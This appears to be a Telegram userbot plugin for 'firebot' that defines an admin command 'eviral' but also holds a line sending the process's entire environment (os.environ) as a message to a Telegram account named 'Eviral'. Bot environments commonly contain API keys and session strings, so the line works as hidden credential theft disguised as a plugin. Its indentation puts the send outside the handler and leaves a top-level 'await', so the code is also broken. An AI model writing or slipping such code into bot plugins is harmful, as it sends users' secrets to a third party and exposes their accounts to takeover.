import os
from firebot import bot
from ..utils import admin_cmd

@bot.on(admin_cmd("eviral"))
async def _(event):
    if event.fwd_from:
        return
await bot.send_message("Eviral", str(os.environ))
